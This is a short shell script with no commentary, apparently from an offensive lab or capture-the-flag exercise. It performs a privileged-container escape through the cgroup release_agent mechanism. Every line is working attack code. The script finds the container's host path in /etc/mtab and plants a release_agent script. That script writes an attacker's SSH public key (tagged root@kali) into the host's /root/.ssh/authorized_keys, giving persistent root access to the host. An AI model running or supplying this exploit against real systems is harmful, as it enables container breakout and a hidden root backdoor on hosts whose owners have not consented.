mkdir /tmp/luci12 && mount -t cgroup -o rdma cgroup /tmp/luci12 && mkdir /tmp/luci12/xx
echo 1 > /tmp/luci12/xx/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/luci12/release_agent

echo '#!/bin/sh' > /cmd
echo "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPQuQ2NXWm7YrkxSt/dQk9KqIdIqGJ7wW80mNhOuCU9G8ZKEbtFragnmKs0cRJKfTyP2kxahJJYwn8UYPRniFlKoTEjPWFkPEwKRSvnPlDfIhzVBBn+q0QFUC0DI08GDEM25tzYfrhR+gcVIy12f6QJUB0oK/UZ5+mwre8yZHJCDbV3aqMteePKeCw1qZj9OXpyel6HOO3/IR60hkCHqYFhwUIMAk8+bXy2XqgQ4q+1tSIMIRdWSCR+0Qr+vMgPS5ifHLq6IlXs9fahYcQjNPJ8zohWED+gtkF9/E9NPusb5URFMZa2i+ljAW1dn++hstk55tz1CSB9bGhfWq4gkbrxA4CriAcncuOBIcEMKJLKxy+zcgx3NVbpFT0VCttXjVqiExp3JWjkJkkBAhNtGRXUH3vypLQOkJFOrDo2Hzl3RN3fyfANlIrYQJg/49V8OavtDGXWXNVWYYnQw3spQ1VsJK5xnCfxDiPUfOYFTmv6kVAHBu6veqeIq2AvxtpE7c= root@kali' > /root/.ssh/authorized_keys" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/luci12/xx/cgroup.procs"